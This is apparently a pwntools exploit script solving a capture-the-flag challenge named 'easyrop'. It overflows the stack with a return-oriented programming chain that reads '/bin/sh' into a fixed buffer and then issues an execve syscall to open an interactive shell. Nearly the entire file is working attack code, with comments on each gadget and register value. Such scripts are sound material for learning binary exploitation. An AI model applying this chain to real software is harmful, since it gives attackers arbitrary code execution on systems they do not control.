from pwn import *
import time

context.arch = "amd64"


CHALL_PATH = "./easyrop"

CHALL = ELF(CHALL_PATH)

COMMANDS = '''
        b *0x40114C
        c
        '''

if args.REMOTE:
    pass
else:
    if args.GDB:
        r = gdb.debug(CHALL_PATH, gdbscript=COMMANDS)
    else:
        r = process(CHALL_PATH)

def sendSomething(x):
    r.send(p64(x))
    r.send(p64(0))

addr_allpops = 0x40108e #pop rdi; pop rsi; pop rdx; pop rax; ret;
addr_syscall = 0x401028
addr_read = 0x401000
addr_buffer = 0x403000 #we use the buffer where we have len discovered with an vmmap

r.recvuntil(b"Try easyROP!")
for i in range(7):
    sendSomething(i)

sendSomething(addr_allpops) #written in the saved_eip
sendSomething(0) #rdi to be popped (instruction above) we are preparing registers for the read
sendSomething(addr_buffer) #rsi to be popped
sendSomething(8) #rdx to be popped (len of /bin/sh\x00)
sendSomething(0) #rax for read
sendSomething(addr_read) #read function that is the return address of the pop addresses above
sendSomething(addr_allpops) #return address of the read
sendSomething(addr_buffer) #rdi
sendSomething(0) #rsi
sendSomething(0) #rdx
sendSomething(0x3b) #rax for execve
sendSomething(addr_syscall) #syscall

r.send(b'\x00')
time.sleep(1)
r.send(b'\x00')
time.sleep(1)
r.sendline(b'/bin/sh\x00')

r.interactive()